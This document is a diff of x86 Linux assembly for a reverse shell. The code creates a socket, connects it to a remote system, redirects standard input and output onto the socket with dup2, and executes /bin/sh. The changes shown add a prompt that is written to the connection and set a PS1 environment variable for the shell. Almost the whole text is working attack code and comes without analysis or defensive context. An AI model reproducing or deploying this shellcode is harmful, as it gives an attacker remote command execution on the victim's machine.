@@ -1,13 +1,17 @@
 global _start
 
 section .data
-    prompt db 10," > ",0
+        prompt db 10," > ",0
+        len equ $-prompt
+        ps1 db "PS1=test ",0
+        envs dd ps1,0
 
 section .text
 
 _start:
 
 ; Creating a socket
+
         ; move decimal 102 in eax - socketcall syscall
         xor eax, eax
         mov al, 0x66    ;converted to hex
@@ -26,6 +30,7 @@ _start:
         int 0x80
 
 ; Connect socket to remote system
+
         ; save return value of socket syscall - socket file descriptor
         xor edx, edx
         mov edx, eax
@@ -52,7 +57,19 @@ _start:
         mov ecx, esp
         int 0x80
 
+label:
+        push edx
+
+        mov eax, 4
+        mov ebx, [esp]
+        mov ecx, prompt
+        mov edx, len
+        int 0x80
+
+        pop edx
+
 ; Duplicate file descriptors
+
         ; push arguments for dup2 syscall
         ; int dup2(int oldfd, int newfd);
         ; dup2 syscall - setting STDIN;
@@ -68,17 +85,23 @@ _start:
         mov al, 0x3f            ; move decimal 63; coverted to hex - dup2 syscall
         mov cl, 0x2
         int 0x80
-        
-; Execute /bin/sh
+
+debug1:
+        ; Execute /bin/sh
         ; exeve syscall
         mov al, 0xb
         ; int execve(const char *pathname, char *const argv[], char *const envp[]);
         ; push //bin/sh on stack
         xor ebx, ebx
-        push ebx                    ; Null
-        push 0x68732f6e        ; hs/n : 68732f6e
-        push 0x69622f2f         ; ib// : 69622f2f
-        mov ebx, esp
+        push ebx                ; Null
+	push 0x0068732f
+        push 0x6e69622f
+	mov ebx, esp
         xor ecx, ecx
+	push ecx		; Null
+	;push 0x74736574
+	;push 0x3d315350
         xor edx, edx
+	mov edx, envs
         int 0x80
+
